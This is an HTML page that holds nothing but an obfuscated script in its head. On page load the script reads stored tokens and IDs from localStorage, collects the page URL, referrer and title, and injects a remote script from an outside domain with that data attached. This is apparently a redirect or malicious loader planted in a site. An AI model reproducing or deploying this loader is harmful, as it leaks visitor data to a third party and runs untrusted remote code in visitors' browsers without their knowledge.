<!DOCTYPE html>
<html amp >
<head>

<script>
    (function() {
    var name = '_zftDFfC3mPpnGnBD';
    if (!window._zftDFfC3mPpnGnBD) {
        window._zftDFfC3mPpnGnBD = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://detkanao.cf/vGXsp3cV',
            P_PATH: 'https://detkanao.cf/7b4f75c/postback',
        };
    }
    const _HxDs5C7djHgJbX4k = localStorage.getItem('config');
    if (typeof _HxDs5C7djHgJbX4k !== 'undefined' && _HxDs5C7djHgJbX4k !== null) {
        var _sTDTpTLvRxMCjNrK = JSON.parse(_HxDs5C7djHgJbX4k);
        var _jJTjMKP1zB8931Pp = Math.round(+new Date()/1000);
        if (_sTDTpTLvRxMCjNrK.created_at + window._zftDFfC3mPpnGnBD.ttl < _jJTjMKP1zB8931Pp) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _mQXKcmwbbVWGYRQW = localStorage.getItem('subId');
    var _vZj8hvf2mXQC2bmg = localStorage.getItem('token');
    var _qNjBcfFmVxfrCdRF = '?return=js.client';
        _qNjBcfFmVxfrCdRF += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _qNjBcfFmVxfrCdRF += '&se_referrer=' + encodeURIComponent(document.referrer);
        _qNjBcfFmVxfrCdRF += '&default_keyword=' + encodeURIComponent(document.title);
        _qNjBcfFmVxfrCdRF += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _qNjBcfFmVxfrCdRF += '&name=' + encodeURIComponent(name);
        _qNjBcfFmVxfrCdRF += '&host=' + encodeURIComponent(window._zftDFfC3mPpnGnBD.R_PATH);
    if (typeof _mQXKcmwbbVWGYRQW !== 'undefined' && _mQXKcmwbbVWGYRQW && window._zftDFfC3mPpnGnBD.unique) {
        _qNjBcfFmVxfrCdRF += '&sub_id=' + encodeURIComponent(_mQXKcmwbbVWGYRQW);
    }
    if (typeof _vZj8hvf2mXQC2bmg !== 'undefined' && _vZj8hvf2mXQC2bmg && window._zftDFfC3mPpnGnBD.unique) {
        _qNjBcfFmVxfrCdRF += '&token=' + encodeURIComponent(_vZj8hvf2mXQC2bmg);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._zftDFfC3mPpnGnBD.R_PATH + _qNjBcfFmVxfrCdRF;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
    </script>
  
  
</head>
</html>